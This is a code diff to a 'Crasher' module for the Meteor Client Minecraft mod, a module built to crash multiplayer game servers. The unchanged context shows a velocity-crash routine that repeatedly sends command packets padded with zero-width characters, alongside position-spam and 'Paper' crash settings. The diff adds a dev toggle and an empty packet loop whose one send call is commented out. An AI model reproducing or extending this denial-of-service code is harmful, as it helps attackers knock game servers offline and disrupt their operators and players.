@@ -7,16 +7,29 @@ import meteordevelopment.meteorclient.settings.*;
 import meteordevelopment.meteorclient.systems.modules.Category;
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.orbit.EventHandler;
+import net.minecraft.client.MinecraftClient;
 import net.minecraft.client.network.ClientPlayNetworkHandler;
-import net.minecraft.network.packet.c2s.play.CommandExecutionC2SPacket;
-import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
+import net.minecraft.client.session.report.ChatAbuseReport;
+import net.minecraft.network.message.LastSeenMessageList;
+import net.minecraft.network.message.MessageSignatureData;
+import net.minecraft.network.packet.c2s.common.CommonPongC2SPacket;
+import net.minecraft.network.packet.c2s.common.KeepAliveC2SPacket;
+import net.minecraft.network.packet.c2s.login.LoginHelloC2SPacket;
+import net.minecraft.network.packet.c2s.play.*;
+import net.minecraft.recipe.NetworkRecipeId;
 import org.joml.Vector3d;
+
+import java.sql.Timestamp;
+import java.time.Instant;
+import java.util.BitSet;
+import java.util.UUID;
 
 public class Crasher extends Module {
     private final SettingGroup sgGeneral = settings.createGroup("General");
     private final SettingGroup sgSpam = settings.createGroup("Paper Skill Crash");
     private final SettingGroup sgPos = settings.createGroup("Position Spammer");
     private final SettingGroup sgVelocity = settings.createGroup("Velocity Crash");
+    private final SettingGroup sgDev = settings.createGroup("dev");
 
     private final Setting<Boolean> disableOnLeave = sgGeneral.add(new BoolSetting.Builder()
         .name("disable-on-leave")
@@ -92,13 +105,20 @@ public class Crasher extends Module {
         .build()
     );
 
+    private final Setting<Boolean> devCrash = sgDev.add(new BoolSetting.Builder()
+        .name("Toggle")
+        .description("test")
+        .defaultValue(false)
+        .build()
+    );
+
 
 
     @EventHandler
     private void onGameLeft(GameLeftEvent event) {
         if (disableOnLeave.get()) toggle();
     }
-    
+
     @EventHandler
     private void onTick(TickEvent.Post event) {
         ClientPlayNetworkHandler handler = mc.getNetworkHandler();
@@ -126,7 +146,14 @@ public class Crasher extends Module {
         if (velocityCrash.get()) {
             String longString = "server " + velocityServer.get() + " " + "\u200D".repeat(velocityBuffer.get());
             for (int i = 0; i < velocityAmount.get(); i++) {
+
                 handler.sendPacket(new CommandExecutionC2SPacket(longString));
+            }
+        }
+
+        if (devCrash.get()) {
+            for (int i = 0; i < 19; i++) {
+//                handler.sendPacket(new Player());
             }
         }
 
